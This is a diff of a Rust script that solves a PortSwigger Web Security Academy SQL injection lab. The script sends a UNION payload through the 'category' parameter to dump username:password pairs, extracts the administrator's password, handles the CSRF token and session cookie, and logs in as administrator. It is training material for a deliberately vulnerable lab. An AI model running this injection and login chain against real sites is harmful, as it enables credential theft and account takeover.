@@ -6,7 +6,7 @@
 *
 * Lab: SQL injection UNION attack, retrieving multiple values in a single column
 *
-* Steps: 1. Inject payload into 'category' query parameter to retrieve administrator 
+* Steps: 1. Inject payload into 'category' query parameter to retrieve administrator
 *           password from users table using concatenation method
 *        2. Fetch the login page
 *        3. Extract csrf token and session cookie
@@ -38,6 +38,7 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0a70005103c78d5081817fc50028004a.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
@@ -51,9 +52,11 @@ fn main() {
         "1. Retrieving administrator password from users table.. ".white(),
     );
     io::stdout().flush();
+
     // payload to retreive the name of users table
     let admin_password_payload =
         "' UNION SELECT null, concat(username , ':', password) from users-- -";
+
     // fetch the page with the injected payload
     let admin_password_injection = client
         .get(format!("{url}/filter?category={admin_password_payload}"))
@@ -63,38 +66,45 @@ fn main() {
             "[!] Failed to fetch the page with the injected payload to retreive administrator password from users table"
                 .red()
         ));
+
+    // get the body of the response
     let mut body = admin_password_injection.text().unwrap();
+
     // extract the name of users table
     let admin_password = capture_pattern("<th>administrator:(.*)</th>", &body).expect(&format!(
         "{}",
         "[!] Failed to extract the administrator password".red()
     ));
-    println!("{} => {}", "OK".green(), admin_password.yellow());
 
+    println!("{} => {}", "OK".green(), admin_password.yellow());
     print!("{}", "2. Fetching login page.. ".white());
     io::stdout().flush();
+
     // fetch the login page
     let fetch_login = client
         .get(format!("{url}/login"))
         .send()
         .expect(&format!("{}", "[!] Failed to fetch login page".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!(
         "{}",
         "3. Extracting csrf token and session cookie.. ".white()
     );
     io::stdout().flush();
+
     // extract session cookie
     let session = extract_session_cookie(fetch_login.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
+
     // extract csrf token
     let csrf =
         extract_csrf(fetch_login).expect(&format!("{}", "[!] Failed to extract csrf token".red()));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     print!("{}", "4. Logging in as the administrator.. ".white(),);
     io::stdout().flush();
+
     // login as the administrator
     let admin_login = client
         .post(format!("{url}/login"))
@@ -109,6 +119,7 @@ fn main() {
             "{}",
             "[!] Failed to login as the administrator".red()
         ));
+
     println!("{}", "OK".green());
 
     // extract the new session
@@ -117,9 +128,10 @@ fn main() {
         "[!] Failed to extract new session cookie".red()
     ));
 
-    // fetch administrator page
     print!("{}", "5. Fetching the administrator profile.. ".white(),);
     io::stdout().flush();
+
+    // fetch administrator page
     let admin = client
         .get(format!("{url}/my-account"))
         .header("Cookie", format!("session={new_session}"))
@@ -128,8 +140,8 @@ fn main() {
             "{}",
             "[!] Failed to fetch administrator profile".red()
         ));
-    println!("{}", "OK".green());
 
+    println!("{}", "OK".green());
     println!(
         "{} {}",
         "🗹 Check your browser, it should be marked now as"
